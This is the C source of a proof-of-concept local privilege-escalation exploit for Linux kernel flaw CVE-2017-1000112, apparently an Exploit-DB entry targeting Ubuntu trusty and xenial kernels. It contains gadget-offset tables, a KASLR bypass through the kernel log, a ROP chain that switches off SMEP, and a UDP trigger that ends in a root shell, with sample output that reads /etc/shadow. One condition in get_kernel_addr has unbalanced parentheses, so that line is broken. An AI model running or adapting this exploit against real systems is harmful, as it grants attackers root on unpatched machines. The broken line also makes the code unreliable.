// A proof-of-concept local root exploit for CVE-2017-1000112.
// Includes KASLR and SMEP bypasses. No SMAP bypass.
// Tested on Ubuntu trusty 4.4.0-* and Ubuntu xenial 4-8-0-* kernels.
//
// EDB Note: Also included the work from ~ https://ricklarabee.blogspot.co.uk/2017/12/adapting-poc-for-cve-2017-1000112-to.html
//           Supports: Ubuntu Xenial (16.04) 4.4.0-81 
//
// Usage:
// user@ubuntu:~$ uname -a
// Linux ubuntu 4.8.0-58-generic #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
// user@ubuntu:~$ whoami
// user
// user@ubuntu:~$ id
// uid=1000(user) gid=1000(user) groups=1000(user),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
// user@ubuntu:~$ gcc pwn.c -o pwn
// user@ubuntu:~$ ./pwn 
// [.] starting
// [.] checking distro and kernel versions
// [.] kernel version '4.8.0-58-generic' detected
// [~] done, versions looks good
// [.] checking SMEP and SMAP
// [~] done, looks good
// [.] setting up namespace sandbox
// [~] done, namespace sandbox set up
// [.] KASLR bypass enabled, getting kernel addr
// [~] done, kernel text:   ffffffffae400000
// [.] commit_creds:        ffffffffae4a5d20
// [.] prepare_kernel_cred: ffffffffae4a6110
// [.] SMEP bypass enabled, mmapping fake stack
// [~] done, fake stack mmapped
// [.] executing payload ffffffffae40008d
// [~] done, should be root now
// [.] checking if we got root
// [+] got r00t ^_^
// root@ubuntu:/home/user# whoami
// root
// root@ubuntu:/home/user# id
// uid=0(root) gid=0(root) groups=0(root)
// root@ubuntu:/home/user# cat /etc/shadow
// root:!:17246:0:99999:7:::
// daemon:*:17212:0:99999:7:::
// bin:*:17212:0:99999:7:::
// sys:*:17212:0:99999:7:::
// ...
//
// EDB Note: Details ~ http://www.openwall.com/lists/oss-security/2017/08/13/1
//
// Andrey Konovalov <andreyknvl@gmail.com>

#define _GNU_SOURCE

#include <assert.h>
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <linux/socket.h>
#include <netinet/ip.h>
#include <sys/klog.h>
#include <sys/mman.h>
#include <sys/utsname.h>

#define ENABLE_KASLR_BYPASS		1
#define ENABLE_SMEP_BYPASS		1

// Will be overwritten if ENABLE_KASLR_BYPASS is enabled.
unsigned long KERNEL_BASE =		0xffffffff81000000ul;

// Will be overwritten by detect_versions().
int kernel = -1;

struct kernel_info {
	const char* distro;
	const char* version;
	uint64_t commit_creds;
	uint64_t prepare_kernel_cred;
	uint64_t xchg_eax_esp_ret;
	uint64_t pop_rdi_ret;
	uint64_t mov_dword_ptr_rdi_eax_ret;
	uint64_t mov_rax_cr4_ret;
	uint64_t neg_rax_ret;
	uint64_t pop_rcx_ret;
	uint64_t or_rax_rcx_ret;
	uint64_t xchg_eax_edi_ret;
	uint64_t mov_cr4_rdi_ret;
	uint64_t jmp_rcx;
};

struct kernel_info kernels[] = {
	{ "trusty", "4.4.0-21-generic", 0x9d7a0, 0x9da80, 0x4520a, 0x30f75, 0x109957, 0x1a7a0, 0x3d6b7a, 0x1cbfc, 0x76453, 0x49d4d, 0x61300, 0x1b91d },
	{ "trusty", "4.4.0-22-generic", 0x9d7e0, 0x9dac0, 0x4521a, 0x28c19d, 0x1099b7, 0x1a7f0, 0x3d781a, 0x1cc4c, 0x764b3, 0x49d5d, 0x61300, 0x48040 },
	{ "trusty", "4.4.0-24-generic", 0x9d5f0, 0x9d8d0, 0x4516a, 0x1026cd, 0x107757, 0x1a810, 0x3d7a9a, 0x1cc6c, 0x763b3, 0x49cbd, 0x612f0, 0x47fa0 },
	{ "trusty", "4.4.0-28-generic", 0x9d760, 0x9da40, 0x4516a, 0x3dc58f, 0x1079a7, 0x1a830, 0x3d801a, 0x1cc8c, 0x763b3, 0x49cbd, 0x612f0, 0x47fa0 },
	{ "trusty", "4.4.0-31-generic", 0x9d760, 0x9da40, 0x4516a, 0x3e223f, 0x1079a7, 0x1a830, 0x3ddcca, 0x1cc8c, 0x763b3, 0x49cbd, 0x612f0, 0x47fa0 },
	{ "trusty", "4.4.0-34-generic", 0x9d760, 0x9da40, 0x4510a, 0x355689, 0x1079a7, 0x1a830, 0x3ddd1a, 0x1cc8c, 0x763b3, 0x49c5d, 0x612f0, 0x47f40 },
	{ "trusty", "4.4.0-36-generic", 0x9d770, 0x9da50, 0x4510a, 0x1eec9d, 0x107a47, 0x1a830, 0x3de02a, 0x1cc8c, 0x763c3, 0x29595, 0x61300, 0x47f40 },
	{ "trusty", "4.4.0-38-generic", 0x9d820, 0x9db00, 0x4510a, 0x598fd, 0x107af7, 0x1a820, 0x3de8ca, 0x1cc7c, 0x76473, 0x49c5d, 0x61300, 0x1a77b },
	{ "trusty", "4.4.0-42-generic", 0x9d870, 0x9db50, 0x4510a, 0x5f13d, 0x107b17, 0x1a820, 0x3deb7a, 0x1cc7c, 0x76463, 0x49c5d, 0x61300, 0x1a77b },
	{ "trusty", "4.4.0-45-generic", 0x9d870, 0x9db50, 0x4510a, 0x5f13d, 0x107b17, 0x1a820, 0x3debda, 0x1cc7c, 0x76463, 0x49c5d, 0x61300, 0x1a77b },
	{ "trusty", "4.4.0-47-generic", 0x9d940, 0x9dc20, 0x4511a, 0x171f8d, 0x107bd7, 0x1a820, 0x3e241a, 0x1cc7c, 0x76463, 0x299f5, 0x61300, 0x1a77b },
	{ "trusty", "4.4.0-51-generic", 0x9d920, 0x9dc00, 0x4511a, 0x21f15c, 0x107c77, 0x1a820, 0x3e280a, 0x1cc7c, 0x76463, 0x49c6d, 0x61300, 0x1a77b },
	{ "trusty", "4.4.0-53-generic", 0x9d920, 0x9dc00, 0x4511a, 0x21f15c, 0x107c77, 0x1a820, 0x3e280a, 0x1cc7c, 0x76463, 0x49c6d, 0x61300, 0x1a77b },
	{ "trusty", "4.4.0-57-generic", 0x9ebb0, 0x9ee90, 0x4518a, 0x39401d, 0x1097d7, 0x1a820, 0x3e527a, 0x1cc7c, 0x77493, 0x49cdd, 0x62300, 0x1a77b },
	{ "trusty", "4.4.0-59-generic", 0x9ebb0, 0x9ee90, 0x4518a, 0x2dbc4e, 0x1097d7, 0x1a820, 0x3e571a, 0x1cc7c, 0x77493, 0x49cdd, 0x62300, 0x1a77b },
	{ "trusty", "4.4.0-62-generic", 0x9ebe0, 0x9eec0, 0x4518a, 0x3ea46f, 0x109837, 0x1a820, 0x3e5e5a, 0x1cc7c, 0x77493, 0x49cdd, 0x62300, 0x1a77b },
	{ "trusty", "4.4.0-63-generic", 0x9ebe0, 0x9eec0, 0x4518a, 0x2e2e7d, 0x109847, 0x1a820, 0x3e61ba, 0x1cc7c, 0x77493, 0x49cdd, 0x62300, 0x1a77b },
	{ "trusty", "4.4.0-64-generic", 0x9ebe0, 0x9eec0, 0x4518a, 0x2e2e7d, 0x109847, 0x1a820, 0x3e61ba, 0x1cc7c, 0x77493, 0x49cdd, 0x62300, 0x1a77b },
	{ "trusty", "4.4.0-66-generic", 0x9ebe0, 0x9eec0, 0x4518a, 0x2e2e7d, 0x109847, 0x1a820, 0x3e61ba, 0x1cc7c, 0x77493, 0x49cdd, 0x62300, 0x1a77b },
	{ "trusty", "4.4.0-67-generic", 0x9eb60, 0x9ee40, 0x4518a, 0x12a9dc, 0x109887, 0x1a820, 0x3e67ba, 0x1cc7c, 0x774c3, 0x49cdd, 0x62330, 0x1a77b },
	{ "trusty", "4.4.0-70-generic", 0x9eb60, 0x9ee40, 0x4518a, 0xd61a2, 0x109887, 0x1a820, 0x3e63ca, 0x1cc7c, 0x774c3, 0x49cdd, 0x62330, 0x1a77b },
	{ "trusty", "4.4.0-71-generic", 0x9eb60, 0x9ee40, 0x4518a, 0xd61a2, 0x109887, 0x1a820, 0x3e63ca, 0x1cc7c, 0x774c3, 0x49cdd, 0x62330, 0x1a77b },
	{ "trusty", "4.4.0-72-generic", 0x9eb60, 0x9ee40, 0x4518a, 0xd61a2, 0x109887, 0x1a820, 0x3e63ca, 0x1cc7c, 0x774c3, 0x49cdd, 0x62330, 0x1a77b },
	{ "trusty", "4.4.0-75-generic", 0x9eb60, 0x9ee40, 0x4518a, 0x303cfd, 0x1098a7, 0x1a820, 0x3e67ea, 0x1cc7c, 0x774c3, 0x49cdd, 0x62330, 0x1a77b },
	{ "trusty", "4.4.0-78-generic", 0x9eb70, 0x9ee50, 0x4518a, 0x30366d, 0x1098b7, 0x1a820, 0x3e710a, 0x1cc7c, 0x774c3, 0x49cdd, 0x62330, 0x1a77b },
	{ "trusty", "4.4.0-79-generic", 0x9ebb0, 0x9ee90, 0x4518a, 0x3ebdcf, 0x1099a7, 0x1a830, 0x3e77ba, 0x1cc8c, 0x774e3, 0x49cdd, 0x62330, 0x1a78b },
	{ "trusty", "4.4.0-81-generic", 0x9ebb0, 0x9ee90, 0x4518a, 0x2dc688, 0x1099a7, 0x1a830, 0x3e789a, 0x1cc8c, 0x774e3, 0x24487, 0x62330, 0x1a78b },
	{ "trusty", "4.4.0-83-generic", 0x9ebc0, 0x9eea0, 0x451ca, 0x2dc6f5, 0x1099b7, 0x1a830, 0x3e78fa, 0x1cc8c, 0x77533, 0x49d1d, 0x62360, 0x1a78b },
	{ "xenial", "4.8.0-34-generic", 0xa5d50, 0xa6140, 0x17d15, 0x6854d, 0x119227, 0x1b230, 0x4390da, 0x206c23, 0x7bcf3, 0x12c7f7, 0x64210, 0x49f80 },
	{ "xenial", "4.8.0-36-generic", 0xa5d50, 0xa6140, 0x17d15, 0x6854d, 0x119227, 0x1b230, 0x4390da, 0x206c23, 0x7bcf3, 0x12c7f7, 0x64210, 0x49f80 },
	{ "xenial", "4.8.0-39-generic", 0xa5cf0, 0xa60e0, 0x17c55, 0xf3980, 0x1191f7, 0x1b170, 0x43996a, 0x2e8363, 0x7bcf3, 0x12c7c7, 0x64210, 0x49f60 },
	{ "xenial", "4.8.0-41-generic", 0xa5cf0, 0xa60e0, 0x17c55, 0xf3980, 0x1191f7, 0x1b170, 0x43996a, 0x2e8363, 0x7bcf3, 0x12c7c7, 0x64210, 0x49f60 },
	{ "xenial", "4.8.0-45-generic", 0xa5cf0, 0xa60e0, 0x17c55, 0x100935, 0x1191f7, 0x1b170, 0x43999a, 0x185493, 0x7bcf3, 0xdfc5, 0x64210, 0x49f60 },
	{ "xenial", "4.8.0-46-generic", 0xa5cf0, 0xa60e0, 0x17c55, 0x100935, 0x1191f7, 0x1b170, 0x43999a, 0x185493, 0x7bcf3, 0x12c7c7, 0x64210, 0x49f60 },
	{ "xenial", "4.8.0-49-generic", 0xa5d00, 0xa60f0, 0x17c55, 0x301f2d, 0x119207, 0x1b170, 0x439bba, 0x102e33, 0x7bd03, 0x12c7d7, 0x64210, 0x49f60 },
	{ "xenial", "4.8.0-52-generic", 0xa5d00, 0xa60f0, 0x17c55, 0x301f2d, 0x119207, 0x1b170, 0x43a0da, 0x63e843, 0x7bd03, 0x12c7d7, 0x64210, 0x49f60 },
	{ "xenial", "4.8.0-54-generic", 0xa5d00, 0xa60f0, 0x17c55, 0x301f2d, 0x119207, 0x1b170, 0x43a0da, 0x5ada3c, 0x7bd03, 0x12c7d7, 0x64210, 0x49f60 },
	{ "xenial", "4.8.0-56-generic", 0xa5d00, 0xa60f0, 0x17c55, 0x39d50d, 0x119207, 0x1b170, 0x43a14a, 0x44d4a0, 0x7bd03, 0x12c7d7, 0x64210, 0x49f60 },
	{ "xenial", "4.8.0-58-generic", 0xa5d20, 0xa6110, 0x17c55, 0xe56f5, 0x119227, 0x1b170, 0x439e7a, 0x162622, 0x7bd23, 0x12c7f7, 0x64210, 0x49fa0 },
    { "xenial", "4.4.0-81-generic", 0xa2800, 0xa2bf0, 0x8a, 0x3eb4ad, 0x112697, 0x1b9c0, 0x40341a, 0x1de6c, 0x7a453, 0x125787, 0x64580, 0x49ed0 },	
};

// Used to get root privileges.
#define COMMIT_CREDS			(KERNEL_BASE + kernels[kernel].commit_creds)
#define PREPARE_KERNEL_CRED		(KERNEL_BASE + kernels[kernel].prepare_kernel_cred)

// Used when ENABLE_SMEP_BYPASS is used.
// - xchg eax, esp ; ret
// - pop rdi ; ret
// - mov dword ptr [rdi], eax ; ret
// - push rbp ; mov rbp, rsp ; mov rax, cr4 ; pop rbp ; ret
// - neg rax ; ret
// - pop rcx ; ret 
// - or rax, rcx ; ret
// - xchg eax, edi ; ret
// - push rbp ; mov rbp, rsp ; mov cr4, rdi ; pop rbp ; ret
// - jmp rcx
#define XCHG_EAX_ESP_RET		(KERNEL_BASE + kernels[kernel].xchg_eax_esp_ret)
#define POP_RDI_RET			(KERNEL_BASE + kernels[kernel].pop_rdi_ret)
#define MOV_DWORD_PTR_RDI_EAX_RET	(KERNEL_BASE + kernels[kernel].mov_dword_ptr_rdi_eax_ret)
#define MOV_RAX_CR4_RET			(KERNEL_BASE + kernels[kernel].mov_rax_cr4_ret)
#define NEG_RAX_RET			(KERNEL_BASE + kernels[kernel].neg_rax_ret)
#define POP_RCX_RET			(KERNEL_BASE + kernels[kernel].pop_rcx_ret)
#define OR_RAX_RCX_RET			(KERNEL_BASE + kernels[kernel].or_rax_rcx_ret)
#define XCHG_EAX_EDI_RET		(KERNEL_BASE + kernels[kernel].xchg_eax_edi_ret)
#define MOV_CR4_RDI_RET			(KERNEL_BASE + kernels[kernel].mov_cr4_rdi_ret)
#define JMP_RCX				(KERNEL_BASE + kernels[kernel].jmp_rcx)

// * * * * * * * * * * * * * * * Getting root * * * * * * * * * * * * * * * *

typedef unsigned long __attribute__((regparm(3))) (*_commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (*_prepare_kernel_cred)(unsigned long cred);

void get_root(void) {
	((_commit_creds)(COMMIT_CREDS))(
	    ((_prepare_kernel_cred)(PREPARE_KERNEL_CRED))(0));
}

// * * * * * * * * * * * * * * * * SMEP bypass * * * * * * * * * * * * * * * *

uint64_t saved_esp;

// Unfortunately GCC does not support `__atribute__((naked))` on x86, which
// can be used to omit a function's prologue, so I had to use this weird
// wrapper hack as a workaround. Note: Clang does support it, which means it
// has better support of GCC attributes than GCC itself. Funny.
void wrapper() {
	asm volatile ("					\n\
	payload:					\n\
		movq %%rbp, %%rax			\n\
		movq $0xffffffff00000000, %%rdx		\n\
		andq %%rdx, %%rax			\n\
		movq %0, %%rdx				\n\
		addq %%rdx, %%rax			\n\
		movq %%rax, %%rsp			\n\
		call get_root				\n\
		ret					\n\
	" : : "m"(saved_esp) : );
}

void payload();

#define CHAIN_SAVE_ESP				\
	*stack++ = POP_RDI_RET;			\
	*stack++ = (uint64_t)&saved_esp;	\
	*stack++ = MOV_DWORD_PTR_RDI_EAX_RET;

#define SMEP_MASK 0x100000

#define CHAIN_DISABLE_SMEP			\
	*stack++ = MOV_RAX_CR4_RET;		\
	*stack++ = NEG_RAX_RET;			\
	*stack++ = POP_RCX_RET;			\
	*stack++ = SMEP_MASK;			\
	*stack++ = OR_RAX_RCX_RET;		\
	*stack++ = NEG_RAX_RET;			\
	*stack++ = XCHG_EAX_EDI_RET;		\
	*stack++ = MOV_CR4_RDI_RET;

#define CHAIN_JMP_PAYLOAD                     \
	*stack++ = POP_RCX_RET;               \
	*stack++ = (uint64_t)&payload;        \
	*stack++ = JMP_RCX;

void mmap_stack() {
	uint64_t stack_aligned, stack_addr;
	int page_size, stack_size, stack_offset;
	uint64_t* stack;

	page_size = getpagesize();

	stack_aligned = (XCHG_EAX_ESP_RET & 0x00000000fffffffful) & ~(page_size - 1);
	stack_addr = stack_aligned - page_size * 4;
	stack_size = page_size * 8;
	stack_offset = XCHG_EAX_ESP_RET % page_size;

	stack = mmap((void*)stack_addr, stack_size, PROT_READ | PROT_WRITE,
			MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
	if (stack == MAP_FAILED || stack != (void*)stack_addr) {
		perror("[-] mmap()");
		exit(EXIT_FAILURE);
	}

	stack = (uint64_t*)((char*)stack_aligned + stack_offset);

	CHAIN_SAVE_ESP;
	CHAIN_DISABLE_SMEP;
	CHAIN_JMP_PAYLOAD;
}

// * * * * * * * * * * * * * * syslog KASLR bypass * * * * * * * * * * * * * *

#define SYSLOG_ACTION_READ_ALL 3
#define SYSLOG_ACTION_SIZE_BUFFER 10

void mmap_syslog(char** buffer, int* size) {
	*size = klogctl(SYSLOG_ACTION_SIZE_BUFFER, 0, 0);
	if (*size == -1) {
		perror("[-] klogctl(SYSLOG_ACTION_SIZE_BUFFER)");
		exit(EXIT_FAILURE);
	}

	*size = (*size / getpagesize() + 1) * getpagesize();
	*buffer = (char*)mmap(NULL, *size, PROT_READ | PROT_WRITE,
				   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

	*size = klogctl(SYSLOG_ACTION_READ_ALL, &((*buffer)[0]), *size);
	if (*size == -1) {
		perror("[-] klogctl(SYSLOG_ACTION_READ_ALL)");
		exit(EXIT_FAILURE);
	}
}

unsigned long get_kernel_addr_trusty(char* buffer, int size) {
	const char* needle1 = "Freeing unused";
	char* substr = (char*)memmem(&buffer[0], size, needle1, strlen(needle1));
	if (substr == NULL) {
		fprintf(stderr, "[-] substring '%s' not found in syslog\n", needle1);
		exit(EXIT_FAILURE);
	}

	int start = 0;
	int end = 0;
	for (end = start; substr[end] != '-'; end++);

	const char* needle2 = "ffffff";
	substr = (char*)memmem(&substr[start], end - start, needle2, strlen(needle2));
	if (substr == NULL) {
		fprintf(stderr, "[-] substring '%s' not found in syslog\n", needle2);
		exit(EXIT_FAILURE);
	}

	char* endptr = &substr[16];
	unsigned long r = strtoul(&substr[0], &endptr, 16);

	r &= 0xffffffffff000000ul;

	return r;
}

unsigned long get_kernel_addr_xenial(char* buffer, int size) {
	const char* needle1 = "Freeing unused";
	char* substr = (char*)memmem(&buffer[0], size, needle1, strlen(needle1));
	if (substr == NULL) {
		fprintf(stderr, "[-] substring '%s' not found in syslog\n", needle1);
		exit(EXIT_FAILURE);
	}

	int start = 0;
	int end = 0;
	for (start = 0; substr[start] != '-'; start++);
	for (end = start; substr[end] != '\n'; end++);

	const char* needle2 = "ffffff";
	substr = (char*)memmem(&substr[start], end - start, needle2, strlen(needle2));
	if (substr == NULL) {
		fprintf(stderr, "[-] substring '%s' not found in syslog\n", needle2);
		exit(EXIT_FAILURE);
	}

	char* endptr = &substr[16];
	unsigned long r = strtoul(&substr[0], &endptr, 16);

	r &= 0xfffffffffff00000ul;
	r -= 0x1000000ul;

	return r;
}

unsigned long get_kernel_addr() {
	char* syslog;
	int size;
	mmap_syslog(&syslog, &size);

	if (strcmp("trusty", kernels[kernel].distro) == 0 &&
	    strncmp("4.4.0", kernels[kernel].version, 5) == 0)
		return get_kernel_addr_trusty(syslog, size);
	if (strcmp("xenial", kernels[kernel].distro) == 0 &&
	    strncmp("4.4.0", kernels[kernel].version, 5) == 0) ||
	    strncmp("4.8.0", kernels[kernel].version, 5) == 0)
		return get_kernel_addr_xenial(syslog, size);

	printf("[-] KASLR bypass only tested on trusty 4.4.0-* and xenial 4-8-0-*");
	exit(EXIT_FAILURE);
}

// * * * * * * * * * * * * * * Kernel structs * * * * * * * * * * * * * * * *

struct ubuf_info {
	uint64_t callback;	// void (*callback)(struct ubuf_info *, bool)
	uint64_t ctx;		// void *
	uint64_t desc;		// unsigned long
};

struct skb_shared_info {
	uint8_t nr_frags;	// unsigned char
	uint8_t tx_flags;	// __u8
	uint16_t gso_size;	// unsigned short
	uint16_t gso_segs;	// unsigned short
	uint16_t gso_type;	// unsigned short
	uint64_t frag_list;	// struct sk_buff *
	uint64_t hwtstamps;	// struct skb_shared_hwtstamps
	uint32_t tskey;		// u32
	uint32_t ip6_frag_id;	// __be32
	uint32_t dataref;	// atomic_t
	uint64_t destructor_arg; // void *
	uint8_t frags[16][17];	// skb_frag_t frags[MAX_SKB_FRAGS];
};

struct ubuf_info ui;

void init_skb_buffer(char* buffer, unsigned long func) {
	struct skb_shared_info* ssi = (struct skb_shared_info*)buffer;
	memset(ssi, 0, sizeof(*ssi));

	ssi->tx_flags = 0xff;
	ssi->destructor_arg = (uint64_t)&ui;
	ssi->nr_frags = 0;
	ssi->frag_list = 0;

	ui.callback = func;
}

// * * * * * * * * * * * * * * * Trigger * * * * * * * * * * * * * * * * * *

#define SHINFO_OFFSET 3164

void oob_execute(unsigned long payload) {
	char buffer[4096];
	memset(&buffer[0], 0x42, 4096);
	init_skb_buffer(&buffer[SHINFO_OFFSET], payload);

	int s = socket(PF_INET, SOCK_DGRAM, 0);
	if (s == -1) {
		perror("[-] socket()");
		exit(EXIT_FAILURE);
	}

	struct sockaddr_in addr;
	memset(&addr, 0, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_port = htons(8000);
	addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);

	if (connect(s, (void*)&addr, sizeof(addr))) {
		perror("[-] connect()");
		exit(EXIT_FAILURE);
	}

	int size = SHINFO_OFFSET + sizeof(struct skb_shared_info);
	int rv = send(s, buffer, size, MSG_MORE);
	if (rv != size) {
		perror("[-] send()");
		exit(EXIT_FAILURE);
	}

	int val = 1;
	rv = setsockopt(s, SOL_SOCKET, SO_NO_CHECK, &val, sizeof(val));
	if (rv != 0) {
		perror("[-] setsockopt(SO_NO_CHECK)");
		exit(EXIT_FAILURE);
	}

	send(s, buffer, 1, 0);

	close(s);
}

// * * * * * * * * * * * * * * * * * Detect * * * * * * * * * * * * * * * * *

#define CHUNK_SIZE 1024

int read_file(const char* file, char* buffer, int max_length) {
	int f = open(file, O_RDONLY);
	if (f == -1)
		return -1;
	int bytes_read = 0;
	while (true) {
		int bytes_to_read = CHUNK_SIZE;
		if (bytes_to_read > max_length - bytes_read)
			bytes_to_read = max_length - bytes_read;
		int rv = read(f, &buffer[bytes_read], bytes_to_read);
		if (rv == -1)
			return -1;
		bytes_read += rv;
		if (rv == 0)
			return bytes_read;
	}
}

#define LSB_RELEASE_LENGTH 1024

void get_distro_codename(char* output, int max_length) {
	char buffer[LSB_RELEASE_LENGTH];
	int length = read_file("/etc/lsb-release", &buffer[0], LSB_RELEASE_LENGTH);
	if (length == -1) {
		perror("[-] open/read(/etc/lsb-release)");
		exit(EXIT_FAILURE);
	}
	const char *needle = "DISTRIB_CODENAME=";
	int needle_length = strlen(needle);
	char* found = memmem(&buffer[0], length, needle, needle_length);
	if (found == NULL) {
		printf("[-] couldn't find DISTRIB_CODENAME in /etc/lsb-release\n");
		exit(EXIT_FAILURE);
	}
	int i;
	for (i = 0; found[needle_length + i] != '\n'; i++) {
		assert(i < max_length);
		assert((found - &buffer[0]) + needle_length + i < length);
		output[i] = found[needle_length + i];
	}
}

void get_kernel_version(char* output, int max_length) {
	struct utsname u;
	int rv = uname(&u);
	if (rv != 0) {
		perror("[-] uname())");
		exit(EXIT_FAILURE);
	}
	assert(strlen(u.release) <= max_length);
	strcpy(&output[0], u.release);
}

#define ARRAY_SIZE(x) (sizeof(x) / sizeof((x)[0]))

#define DISTRO_CODENAME_LENGTH 32
#define KERNEL_VERSION_LENGTH 32

void detect_versions() {
	char codename[DISTRO_CODENAME_LENGTH];
	char version[KERNEL_VERSION_LENGTH];

	get_distro_codename(&codename[0], DISTRO_CODENAME_LENGTH);
	get_kernel_version(&version[0], KERNEL_VERSION_LENGTH);

	int i;
	for (i = 0; i < ARRAY_SIZE(kernels); i++) {
		if (strcmp(&codename[0], kernels[i].distro) == 0 &&
		    strcmp(&version[0], kernels[i].version) == 0) {
			printf("[.] kernel version '%s' detected\n", kernels[i].version);
			kernel = i;
			return;
		}
	}

	printf("[-] kernel version not recognized\n");
	exit(EXIT_FAILURE);
}

#define PROC_CPUINFO_LENGTH 4096

// 0 - nothing, 1 - SMEP, 2 - SMAP, 3 - SMEP & SMAP
int smap_smep_enabled() {
	char buffer[PROC_CPUINFO_LENGTH];
	int length = read_file("/proc/cpuinfo", &buffer[0], PROC_CPUINFO_LENGTH);
	if (length == -1) {
		perror("[-] open/read(/proc/cpuinfo)");
		exit(EXIT_FAILURE);
	}
	int rv = 0;
	char* found = memmem(&buffer[0], length, "smep", 4);
	if (found != NULL)
		rv += 1;
	found = memmem(&buffer[0], length, "smap", 4);
	if (found != NULL)
		rv += 2;
	return rv;
}

void check_smep_smap() {
	int rv = smap_smep_enabled();
	if (rv >= 2) {
		printf("[-] SMAP detected, no bypass available\n");
		exit(EXIT_FAILURE);
	}
#if !ENABLE_SMEP_BYPASS
	if (rv >= 1) {
		printf("[-] SMEP detected, use ENABLE_SMEP_BYPASS\n");
		exit(EXIT_FAILURE);
	}
#endif
}

// * * * * * * * * * * * * * * * * * Main * * * * * * * * * * * * * * * * * *

static bool write_file(const char* file, const char* what, ...) {
	char buf[1024];
	va_list args;
	va_start(args, what);
	vsnprintf(buf, sizeof(buf), what, args);
	va_end(args);
	buf[sizeof(buf) - 1] = 0;
	int len = strlen(buf);

	int fd = open(file, O_WRONLY | O_CLOEXEC);
	if (fd == -1)
		return false;
	if (write(fd, buf, len) != len) {
		close(fd);
		return false;
	}
	close(fd);
	return true;
}

void setup_sandbox() {
	int real_uid = getuid();
	int real_gid = getgid();

	if (unshare(CLONE_NEWUSER) != 0) {
		printf("[!] unprivileged user namespaces are not available\n");
		perror("[-] unshare(CLONE_NEWUSER)");
		exit(EXIT_FAILURE);
	}
	if (unshare(CLONE_NEWNET) != 0) {
		perror("[-] unshare(CLONE_NEWUSER)");
		exit(EXIT_FAILURE);
	}

	if (!write_file("/proc/self/setgroups", "deny")) {
		perror("[-] write_file(/proc/self/set_groups)");
		exit(EXIT_FAILURE);
	}
	if (!write_file("/proc/self/uid_map", "0 %d 1\n", real_uid)) {
		perror("[-] write_file(/proc/self/uid_map)");
		exit(EXIT_FAILURE);
	}
	if (!write_file("/proc/self/gid_map", "0 %d 1\n", real_gid)) {
		perror("[-] write_file(/proc/self/gid_map)");
		exit(EXIT_FAILURE);
	}

	cpu_set_t my_set;
	CPU_ZERO(&my_set);
	CPU_SET(0, &my_set);
	if (sched_setaffinity(0, sizeof(my_set), &my_set) != 0) {
		perror("[-] sched_setaffinity()");
		exit(EXIT_FAILURE);
	}

	if (system("/sbin/ifconfig lo mtu 1500") != 0) {
		perror("[-] system(/sbin/ifconfig lo mtu 1500)");
		exit(EXIT_FAILURE);
	}
	if (system("/sbin/ifconfig lo up") != 0) {
		perror("[-] system(/sbin/ifconfig lo up)");
		exit(EXIT_FAILURE);
	}
}

void exec_shell() {
	char* shell = "/bin/bash";
	char* args[] = {shell, "-i", NULL};
	execve(shell, args, NULL);
}

bool is_root() {
	// We can't simple check uid, since we're running inside a namespace
	// with uid set to 0. Try opening /etc/shadow instead.
	int fd = open("/etc/shadow", O_RDONLY);
	if (fd == -1)
		return false;
	close(fd);
	return true;
}

void check_root() {
	printf("[.] checking if we got root\n");
	if (!is_root()) {
		printf("[-] something went wrong =(\n");
		return;
	}
	printf("[+] got r00t ^_^\n");
	exec_shell();
}

int main(int argc, char** argv) {
	printf("[.] starting\n");

	printf("[.] checking distro and kernel versions\n");
	detect_versions();
	printf("[~] done, versions looks good\n");

	printf("[.] checking SMEP and SMAP\n");
	check_smep_smap();
	printf("[~] done, looks good\n");

	printf("[.] setting up namespace sandbox\n");
	setup_sandbox();
	printf("[~] done, namespace sandbox set up\n");

#if ENABLE_KASLR_BYPASS
	printf("[.] KASLR bypass enabled, getting kernel addr\n");
	KERNEL_BASE = get_kernel_addr();
	printf("[~] done, kernel text:   %lx\n", KERNEL_BASE);
#endif

	printf("[.] commit_creds:        %lx\n", COMMIT_CREDS);
	printf("[.] prepare_kernel_cred: %lx\n", PREPARE_KERNEL_CRED);

	unsigned long payload = (unsigned long)&get_root;

#if ENABLE_SMEP_BYPASS
	printf("[.] SMEP bypass enabled, mmapping fake stack\n");
	mmap_stack();
	payload = XCHG_EAX_ESP_RET;
	printf("[~] done, fake stack mmapped\n");
#endif

	printf("[.] executing payload %lx\n", payload);
	oob_execute(payload);
	printf("[~] done, should be root now\n");

	check_root();

	return 0;
}
